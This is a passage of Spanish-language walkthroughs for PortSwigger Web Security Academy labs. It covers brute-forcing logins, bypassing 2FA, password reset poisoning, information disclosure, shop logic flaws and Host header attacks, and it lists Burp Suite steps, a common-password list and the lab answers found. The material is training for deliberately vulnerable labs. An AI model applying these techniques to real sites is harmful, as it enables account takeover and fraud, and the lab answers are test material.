4. Analizar la longitud de la respuesta, identificando aquella de longitud diferente y verificando el cambio en el mensaje de error.
5. En la pestaña Position, dejar fijo el usuario encontrado en el paso anterior y parametrizar la contraseña.
6. En la pestaña Payload pegar el listado de contraseñas e iniciar el ataque.
7. Observar el cambio en el código de respuesta cuando la contraseña es la correcta.
8. Utilizar el usuario y contraseña identificados para iniciar sesión e ir a My account para completar el laboratorio.

#### Solución encontrada:

- Username: att
- Password: 12345

### [Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)

#### Descripción:

Repetir los pasos del laboratorio anterior pero en lugar de observar la longitud de la respuesta para el nombre de usuario, identificar el mensaje de error que le falta el punto en "Invalid username or password.". Esto se puede hacer más fácilmente si se extrae el mensaje de error: antes de iniciar el ataque, ir a pestaña Options, en la sección Grep-Extract cliquear en Add y seleccionar con el mouse el contenido de la respuesta que corresponde al mensaje de error. Luego, iniciar el ataque; se mostrará para cada petición el mensaje de error correspondiente, pudiendo identificar rápidamente aquél que es distinto (para ello también se pueden ordenar los resultados por la columna correspondiente al mensaje de respuesta).

#### Solución encontrada:

- Username: appserver
- Password: superman

### [Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)

#### Descripción:

Repetir los pasos de los laboratorios anteriores con las siguientes consideraciones:

- Seleccionar pitchfork como tipo de ataque.
- Dejar fija como contraseña una cadena larga de caracteres (100 o más). Esto se debe a que la respuesta es más lenta cuando un usuario es correcto y se debe verificar la contraseña. Cuando más larga es la contraseña, más tarda la respuesta.
- Añadir a la request el header X-Forwarded-For, parametrizando este y el usuario. El propósito de este header es evitar que se bloqueen las reiteradas solicitudes.
- En el payload correspondiente al header, seleccionar un payload de tipo numérico, entre 1 y 100 con step 1 para que se modifique en cada solicitud.
- En los resultados, añadir la columna Response Received e identificar aquella con un tiempo considerablemente mayor. Esta corresponderá a un usuario válido.

#### Solución encontrada:

- Username: admins
- Password: abc123

### [Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)

#### Descripción:

El escenario bloquea la IP cuando se producen 3 intentos fallidos de inicio de sesión. Sin embargo, ante un inicio de sesión correcto, ese contador se resetea. Esto se puede utilizar para parametrizar usuario y contraseña de la solicitud, alternando 2 intentos de acceso con el usuario objetivo (carlos) y 1 con nuestro usuario hasta dar con la contraseña correcta.

- [Username payload](https://docs.google.com/document/d/1h_IY5eF4GmU3EV6dkLLCkayMpzhFqMin3IB04nIs654/edit?usp=sharing)
- [Password payload](https://docs.google.com/document/d/1wPU2cm6JWMJATCqWO_UuYEZNrtsBiv-8XncL1denB-0/edit?usp=sharing)

#### Solución encontrada:

- Username: carlos
- Password: george

### [Username enumeration via account lock](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)

#### Descripción:

En este caso una cuenta existente se bloquea luego de 5 intentos de acceso fallidos. Esto se puede utilizar para obtener un usuario válido:

1. Utilizar el ataque "Cluster bomb" para realizar 5 intentos de acceso a cada usuario de la lista.
2. Observar la longitud de la respuesta para identificar aquél con el mensaje de error distinto, avisando que la cuenta ha sido bloqueada.

Con el usuario identificado, realizar un ataque de fuerza bruta sobre la contraseña. Al intentar acceder con la contraseña correcta a una cuenta bloqueada, existe un bug lógico por el cual el error de que la cuenta está bloqueada no se muestra, por lo que se puede identificar dicha contraseña y, una vez pasado el tiempo de bloqueo, acceder a la cuenta.

#### Solución encontrada:

- Username: accounts
- Password: 11111111

### [Broken brute-force protection, multiple credentials per request](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)

#### Descripción:

Existe una falla lógica que al enviar en una request un array de contraseñas, todas ellas son evaluadas, obteniendo acceso siempre que se incluya la correcta.

#### Solución:

Enviar una request con:

- Username: "carlos"
- Password: ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]

### [2FA simple bypass](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)

#### Descripción:

Al ingresar un usuario y contraseña correctos, el sistema ya inicia la sesión, y redirige al usuario a una página donde solicita el código de verificación enviado al email. Como la sesión ya se inició, se puede acceder a urls protegidas, saltando el control del código.

#### Solución:

Ingresar con las credenciales de la víctima (carlos:montoya) y cuando el código de verificación sea solicitado, reemplazar manualmente la url por /my-account

### [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)

#### Descripción:

Existe un error lógico por el cual se puede ingresar a una cuenta conociendo su usuario y código de verificación, sin ingresar su contraseña. Esto se debe a que la sesión se inicia al ingresar un código de verificación correcto asociado al usuario con el que teóricamente se ingresó. Sin embargo, se puede modificar el usuario en la request, por lo que es vulnerable a:

1. Ingresar con las credenciales brindadas (wiener:peter).
2. Ingresar un código de verificación cualquiera.
3. Modificar la solicitud de generación del código de verificación (realizada automáticamente en el paso 1), reemplazando nuestro usuario por el usuario objetivo (carlos).
4. Modificar la solicitud en la que se envía el código de verificación (paso 2), reemplazando nuestro usuario por el usuario objetivo.
5. Realizar un ataque de fuerza bruta sobre el código de verificación del usuario objetivo, siendo este un código numérico de 4 dígitos.

#### Solución encontrada:

- Código de verificación: 0068

### [2FA bypass using a brute-force attack](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack)

#### Descripción:

Existe una protección contra ataques de fuerza bruta al código de verificación: si se ingresan 2 códigos de verificación erróneos, el usuario debe volver a autenticarse con su usuario y contraseña. La solución a este problema consiste en establecer una macro en Burp que vuelva a iniciar la sesión del usuario en cada request y luego hacer un ataque por fuerza bruta idéntico al del laboratorio anterior.

#### Solución encontrada:

- Código de verificación: 1041

### [Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)

#### Descripción:

Existe una protección contra ataques de fuerza bruta que bloquea los inicios de sesión una vez que se han producido 5 intentos fallidos. Sin embargo, la funcionalidad para mantener iniciada una sesión se implementa mediante cookies, las cuales guardan el usuario y la contraseña (en MD5) encodeados en base 64. De esta manera, se puede realizar un ataque de fuerza bruta utilizando esta cookie para iniciar sesión.

#### Solución encontrada:

- Cookie stay-logged-in: Y2FybG9zOjIxYjcyYzBiN2FkYzVjN2I0YTUwZmZjYjkwZDkyZGQ2 (que corresponde a carlos:matrix)

### [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

#### Descripción:

Se utiliza la misma cookie del laboratorio anterior para guardar la sesión y, además, el blog es vulnerable a un XSS en los comentarios de los post. Por lo tanto, se puede hacer una solicitud al exploit server del laboratorio con el valor de la cookie del usuario. Una vez que el usuario ingresa al post, se ejecuta el script que envía su cookie de stay-logged-in, por lo que solo resta revisar las solicitudes recibidas en el exploit server y decodificar la cookie (y desencriptar la contraseña que se encuentra en MD5) para obtener sus credenciales.

#### Solución:

- Username: carlos
- Password: onceuponatime

### [Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)

#### Descripción:

En la funcionalidad de recuperación de contraseña, al establecer la nueva contraseña, se envía en la request tanto la nueva contraseña como el usuario correspondiente y no se realiza ningún chequeo sobre el parámetro temp-forgot-password-token, por lo que cualquier usuario puede realizar una solicitud con el nombre de usuario que desee atacar y cambiarle la contraseña, obteniendo acceso a dicha cuenta.

### [Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)

#### Descripción:

El link generado para la recuperación de contraseñas utiliza un token para identificar al usuario correspondiente al que se le generará la nueva contraseña. Sin embargo, la request en la que se solicita dicho link admite el header X-Forwarded-Host, por lo que se puede solicitar la recuperación de contraseña del usuario objetivo cambiando el header mencionado y enviando así dicha solicitud al exploit server, consiguiendo de esta manera acceso al token del usuario y pudiendo, por lo tanto, establecer la nueva contraseña para dicho usuario.

#### Solución encontrada:

- temp-forgot-password-token: Y9UnwhR8m30gML08KsJi1FAST4aI6aWi

### [Password brute-force via password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)

#### Descripción:

La funcionalidad de cambio de contraseña especifica en la request el usuario que inició sesión y que quiere cambiar la contraseña (pudiendo por lo tanto modificarlo), pero solicita la contraseña actual que es desconocida. A su vez, como protección contra ataques de fuerza bruta, bloquea la cuenta cuando se ingresa una contraseña actual incorrecta. Sin embargo, si los campos nueva contraseña y repetir nueva contraseña no coinciden, este control no se hace, diferenciando además el mensaje de error cuando la contraseña actual es incorrecta de cuando la contraseña actual es correcta pero las nuevas contraseñas no coinciden, por lo que se puede realizar un ataque de fuerza bruta sobre la misma.

#### Solución encontrada:

- Username: carlos
- Password: starwars

---

## [WebSockets](https://portswigger.net/web-security/websockets)

---

## [Insecure deserialization](https://portswigger.net/web-security/deserialization)

---

## [Information disclosure](https://portswigger.net/web-security/information-disclosure)

### [Information disclosure in error messages](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages)

#### Descripción:

Hacer una request de los detalles de un producto, pasando como productId un string:
https://LABID.web-security-academy.net/product?productId=asd

#### Solución:

2 2.3.31

### [Information disclosure on debug page](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page)

#### Descripción:

1. Buscar en los comentarios la url de debug
2. Hacer una request a https://LABID.web-security-academy.net/cgi-bin/phpinfo.php para obtener la secret key

#### Solución:

3jbksebn9ti5zjbmlfzu00z21i8qv3bp

### [Source code disclosure via backup files](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files)

#### Descripción:

1. Buscar en robots.txt las url no indexadas
2. Ir a https://LABID.web-security-academy.net/backup
3. Acceder al archivo ProductTemplate.java.bak
4. Identificar la contraseña de la base de datos en la cadena de conexión

#### Solución:

75x280c4b39i7byks9ts7przmhnax61p

### [Authentication bypass via information disclosure](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)

#### Solución:

1. Añadir una regla de reemplazo de headers en el proxy de Burp, ingresando como contenido de reemplazo: X-Custom-IP-Authorization: 127.0.0.1
2. Acceder a https://LABID.web-security-academy.net/admin
3. Eliminar la cuenta de Carlos

### [Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)

#### Descripción:

1. Descargar los archivos de https://LABID.web-security-academy.net/.git
2. En el directorio hacer git log para ver los commits
3. Hacer git reset 8ec321d3725b8fcf2555675518f9853377ae1ed5 para volver al commit anterior a la eliminación de la contraseña de administrador
4. Hacer git checkout . para restaurar el archivo admin.conf eliminado y abrirlo para ver la contraseña

#### Solución encontrada:

Username: administrator
Password: b0x8mj81062zzrosml0q

---

## [Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)

### [Excessive trust in client-side controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)

#### Descripción:

Al añadir un producto al carrito de compras, el precio del mismo se especifica en la request, por lo que puede ser modificado.

#### Solución:

1. Iniciar sesión con las credenciales proporcionadas (wiener:peter)
2. Ver los detalles de Lightweight "l33t" Leather Jacket
3. Activar la intercepción en Burp proxy
4. Añadir al carrito el producto
5. En la request interceptada, modificar el parámetro price por un valor entero (por ejemplo 1 centavo)
6. Completar la orden

### [High-level logic vulnerability](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level)

#### Descripción:

Al añadir un producto al carrito de compras, la cantidad añadida se especifica en la request, por lo que puede ser modificada, y no se controla que la cantidad sea positiva, por lo que se puede especificar una cantidad negativa de un producto para conseguir un descuento en la compra de otros productos.

#### Solución:

1. Iniciar sesión con las credenciales proporcionadas (wiener:peter)
2. Ver los detalles de algún producto que no sea Lightweight "l33t" Leather Jacket
3. Activar la intercepción en Burp proxy
4. Añadir al carrito el producto
5. En la request interceptada, modificar el parámetro cantidad por un valor negativo
6. Añadir al carrito el producto Lightweight "l33t" Leather Jacket
7. En el checkout ajustar la cantidad negativa del otro producto de manera que el costo total sea > $0 (ya que esto sí es controlado, por lo que se obtiene un error) y < $100 (crédito en la tienda)
8. Completar la orden

### [Low-level logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level)

#### Descripción:

Se pueden pedir hasta 99 unidades de cada producto por vez, pero esto se puede realizar múltiples veces dentro de una misma compra. Esto se puede aprovechar para desbordar la variable que almacena el precio total de la compra, cuyo máximo valor es 21.474.836,47.

- Precio a sumar = 21.474.836 \* 2 = 42.949.672 (desde 0 a 21.474.836 y desde -21.474.836 a 0)
- Costo de cada orden = 1.337 \* 99 = 132.363
- Cantidad de órdenes de 99 Lightweight "l33t" Leather Jacket = 42.949.672 / 132.363 = 324,48

#### Solución:

1. Iniciar sesión con las credenciales proporcionadas (wiener:peter)
2. Añadir 99 Lightweight "l33t" Leather Jacket al carrito
3. Repetir la request anterior 323 veces. El total de unidades debería ser 32076 y el precio de la orden -\$64.060,96
4. Añadir otros producto de manera que el precio quede entre $0 y $100 (por ejemplo 47 unidades de Lightweight "l33t" Leather Jacket y 16 unidades de Conversation Controlling Lemon: 47 \* $1337 + 16 \* $80.72 = 64.130,52)
5. Completar la orden

### [Inconsistent handling of exceptional input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)

No pudimos resolver el laboratorio porque se requiere usar las Engagement tools (dentro de Target -> Site map), que sólo están disponibles en la versión Pro de Burp Suite.

### [Inconsistent security controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls)

No pudimos resolver el laboratorio porque se requiere usar las Engagement tools (dentro de Target -> Site map), que sólo están disponibles en la versión Pro de Burp Suite.

### [Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)

Para resolver este laboratorio se debe:

1. Iniciar sesión en el sitio vulnerable, ir a "My account", activar Intercept y cambiar la contraseña.
2. En la request interceptada, eliminar el parámetro `current-password`.
3. En la misma request, cambiar el valor del parámetro `username` por `administrator`.
4. _Forwardear_ la request.
5. Cerrar sesión e iniciar sesión como administrator con la contraseña cambiada.
6. Ir al panel de administración y eliminar al usuario carlos.

### [Insufficient workflow validation](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)

1. Con Intercept activado, iniciar sesión y comprar cualquier producto que esté dentro del crédito disponible (por ejemplo, un _Beat the Vacation Traffic_).
2. La última request interceptada, cuando se compra algo (la de `POST /cart/checkout`), redirige a una página que confirma que la compra fue exitosa. Esa request hay que enviar a Repeater.
3. Agregar un _Lightweight l33t leather jacket_ al carrito.
4. Con Repeater volver a enviar la request de confirmación de compra. La compra se completa y no se descuenta saldo.

### [Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)

No pudimos resolver el laboratorio porque se requiere usar las Engagement tools (dentro de Target -> Site map), que sólo están disponibles en la versión Pro de Burp Suite.

### [Flawed enforcement of business rules](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules)

Para resolver este laboratorio se debe:

1. Iniciar sesión en el sitio vulnerable. Los nuevos usuarios pueden usar el cupón de descuento `NEWCUST5`.
2. Al final de la página, suscribirse al _newsletter_. Entonces se puede usar otro código más, `SIGNUP30`.
3. Agregar un _Lightweight l33t leather jacket_ al carrito.
4. Ir al checkout y aplicar ambos cupones.
5. Si se intenta aplicar dos veces seguidas un mismo cupón, sale un error. Sin embargo, si se van alternando los cupones, no da ningún error.
6. Reutilizar ambos cupones hasta que el total de la compra sea menor al saldo disponible y comprar el producto.

### [Infinite money logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)

Para resolver este laboratorio se debe:

1. Con el Intercept de Burp activado, iniciar sesión y suscribirse al *newsletter* para obtener un cupón de descuento `SIGNUP30`.
2. Agregar al carrito una `Gift card` e ir al checkout. Aplicar el código para obtener un 30% de descuento. Confirmar la orden y copiar el código de la gift card.
3. Ir a My account y *redimir* la gift card. Esto agrega $3 al saldo de la tienda.
4. En HTTP history, la request `POST /gift-card` contiene el código de la misma al *redimirse*.
5. Ir a "Project options" > "Sessions". En el panel "Session handling rules" hacer clic en "Add". Se abre el diálogo "Session handling rule editor".
6. Ir a la pestaña "Scope". Dentro de "URL Scope" seleccionar "Include all URLs".
7. Volver a la pestaña "Details". Dentro de "Rule actions" hacer clic en "Add" > "Run a macro". Dentro de "Select macro" hacer clic en "Add" para abrir el Macro Recorder.
8. Seleccionar las siguientes requests (en este orden), Después hacer clic en "OK". Se abre el Macro editor.

```
POST /cart
POST /cart/coupon
POST /cart/checkout
GET /cart/order-confirmation?order-confirmed=true
POST /gift-card
```

9. En la lista de requests, seleccionar `GET /cart/order-confirmation?order-confirmed=true`. Hacer clic en "Configure item". En el diálogo que se abre hacer clic en "Add" para crear un nuevo parámetro, al que ahy que llamarlo `gift-card`. Seleccionar el código de la gift card al final de la response. Hacer clic en "OK" dos veces para volver al Macro Editor.
10. Seleccionar la request `POST /gift-card` y hacer clic en "Configure item" otra vez. En la sección "Parameter handling" seleccionar "Derive from prior response" del drop-down al lado de `gift-card`, y en el de al lado seleccionar "Response 4". Hacer clic en "OK".
11. En el Macro Editor, hacer clic en "Test macro". Ver el código de la gift card generado en la response a `GET /cart/order-confirmation?order-confirmation=true`. Asegurarse que el parámetro `gift-card` de `POST /gift-card request` coincide con el código anterior y de que la response tiene código 302. Hacer clic en "OK" hasta volver a la ventana principal del Burp.
12. Enviar la request `GET /my-account` a Intruder. Usar el ataque "Sniper" y hacer clic en "Clear §".
13. En la pestaña "Payloads", seleccionar el tipo de payload "Null payloads". Dentro de "Payload options" elegir generar 412 payloads. En la pestaña "Options", poner el "thread count" en 1. Empezar el ataque.
14. Cuando termine el ataque, comprar el *Lightweight l33t leather jacket* y listo.

### [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)

Para resolver este lab se debe:

1. Iniciar sesión con la opción "Stay logged in" activada y hacer un comentario. En la request interceptada por Burp la cookie `stay-logged-in` está encriptada.
2. Hacer otro comentario pero con una dirección de correo inválida (ej: `foofoofoobarbarbar`). En la response habrá una cookie `notification` encriptada, y luego se redirige a la entrada del blog.
3. En el blog va a haber un mensaje de error `Invalid email address: email-invalido-ingresado`. Al parecer, eso se desencripta de la cookie de `notification`. Enviar las request `POST /post/comment` y `GET /post?postId=x` a Repeater.
4. Dentro de Repeaterm se puede usar el parámetro `email` del POST para encriptar cualquier cosa, y ver el texto cifrado en el header `Set-Cookie`. También se puede usar la cookie `notification` del GET para desencriptar otra cualquier cosa y ver el resultado en el mensaje de error del blog (el laboratorio recomienda renombrar las pestañas de ambas request, para saber cuál encripta y cuál desencripta).
5. En la request de desencriptar, copiar la cookie `stay-logged-in` y pegarla en `notification`. Enviar la request. Ahora la response ya no tiene mensaje de error, sino que tiene esa cookie pero desencriptada. El formato de salida es `usario:timestamp`. Copiar el timestamp.
6. Ir a la request de encriptar y cambiar el parámetro `email` por `administrator:timestamp`. Enviar la request y copiar el nuevo valor de `notification` de la response.
7. Desencriptar el valor obtenido. Sea cual sea el valor ques se pase, se agrega el prefijo `Invalid email address: `. Enviar el valor de `notification` a Decoder.
8. En Decoder, decodear en URL y Base64 la cookie. Seleccionar "Hex", hacer clic derecho en el primer byte, seleccionar "Delete bytes" y eliminar 23 bytes (para limpiar el mensaje de Invalid email).
9. Volver a encodear el resultado, copiarlo en `notification` y enviar la request. Ahora en la response va a haber un mensaje de error, indicando que la entrada a encriptar debe ser múltiplo de 16 (porque usa un algoritmo de encriptación por bloques).
10. Volver a la request de encriptar en Repeater y agregar 9 caracteres cualesquiera al comienzo del valor de `email` (por ejemplo: `xxxxxxxxxadministrator:your-timestamp`). Enviar la request y desencriptar.
11. Enviar el texto cifrado a Decoder y volver a decodear como antes. Eliminar 32 bytes al comienzo. Volver a encodear y pegar el resultado en `notification`. Ahora el resultado en la response debería ser `administrator:timestamp`.
12. En HTTP history, enviar la request `GET /` a Repeater. Borrar la cookie `session` y reemplazar la cookie `stay-logged-in` con el último texto cifrado. Enviar la request, y ahora se va a estar logueado como administrator.
13. Usando Repeater, navegar a `/admin/delete?username=carlos` para resolver el laboratorio.

---

## [HTTP Host header attacks](https://portswigger.net/web-security/host-header)

### [Basic password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning)

Para resolver este laboratorio, se debe analizar la funcionalidad "Forgot password?" de la sección Login. Al hacer click en el mismo, si vamos al exploit server y luego hacemos click en Email Client nos aparecerá un mail con una url para restablecer la contraseña de la cuenta con la que nos autenticamos (wiener). Al analizar esta url se observa que la misma contiene un token.
En el HTTP History de burpsuite, buscamos el POST de "/forgot-password" y lo mandamos al repeater. Analizamos la petición probando distintos host, notando que la respuesta sigue siendo con status 200. Aprovechando esto, cambiamos el host header al dominio del exploit server del laboratorio, y cambiamos el parametro username a "carlos".
Yendo al exploit server, y buscando por "/forgot-password", vemos que tiene un token como parámetro, el cual vamos a meter en la url del correo recibido en primera instancia al clickear sobre Forgot password, y visitando esta página en el navegador y cambiando la contraseña de carlos por una nueva, para luego autenticarse con la misma, el laboratorio queda resuelto.

### [Password reset poisoning via dangling markup](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)

Similar al laboratorio anterior, pero ahora al cambiar el host header del POST en "/forgot-password", devuelve un status 504. Por lo que se procede a probar con el mismo host seguido de ":puertoArbitrario". A partir de esto, se puede deducir la concatenación del siguiente href:
    
    ```html
    '<a href="//ac571fd61fa20fdd8074141c015b0054.web-security-academy.net//?
    ```

Donde la URL es la dirección del exploit server. En el parámetro username del csrf de la petición lo cambiamos por carlos, y luego de enviarlo vamos a ver los logs del explit server buscando "password" (aparecerá el texto que nos llegó en el mail en primera instancia al hacer click en forgot password), copiamos el string que le sigue a esta palabra, el cual es la contraseña del usuario carlos, y nos logueamos con la misma.

### [Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)

Para resolver este laboratorio, analizamos el GET que se hace al entrar al laboratorio, lo mandamos al repeater, y probamos enviar peticiones prestando atención en los headers X-Cache y Cache-Control. Al agregar un parámetro arbitrario a la request "limpiamos caché" y obtenemos una nueva respuesta del servidor.
Probando agregar un segundo header para el host, se puede ver en el body de la respuesta que este se refleja en la url /resources/js/tracking.js.
Lo siguiente es el ir al exploit server y en el input file ponemos /resources/js/tracking.js, y en el body el alert con el document.cookie.
En el segundo host header en el repetidor ponemos la url del exploit server.
Enviamos la request y repetimos el proceso limpiando "destructores de caché" (los parámetros arbitrarios que agregamos para obtener una respuesta del servidor) y actualizando la página de inicio hasta que el laboratorio se marque como solved.

### [Host header authentication bypass](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass)

Al intentar acceder a /admin desde el navegador en el laboratorio, nos sale el mensaje Admin Interface Only Available for local users. Analizando esta request con burpsuite, mandándola al repeater, cambiamos el contenido de host header por localhost, con lo que accedemos al panel de administración con la opción de eliminar usuarios.
Cambiamos la solicitud por /admin/delete?username=carlos

### [Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)

No pudimos resolver el laboratorio porque se requiere usar el Burp Collaborator Client, que sólo están disponibles en la versión Pro de Burp Suite.

### [SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)

No pudimos resolver el laboratorio porque se requiere usar el Burp Collaborator Client, que sólo están disponibles en la versión Pro de Burp Suite.